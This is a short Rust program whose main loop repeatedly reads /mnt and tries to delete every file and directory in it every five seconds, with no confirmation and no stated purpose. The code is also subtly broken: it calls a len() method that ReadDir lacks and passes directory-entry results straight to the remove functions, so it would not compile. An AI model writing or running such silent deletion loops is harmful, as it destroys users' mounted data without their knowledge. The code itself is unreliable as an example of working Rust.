fn main() {
    loop {
        let Ok(dir) = std::fs::read_dir("/mnt") else {
            continue
        };
        let index = dir.len();
        println!("Found {index}");

        for path in dir {
            let _ = std::fs::remove_file(path);
            let _ = std::fs::remove_dir(path);
        }
        std::thread::sleep(std::time::Duration::from_secs(5));
    }
}
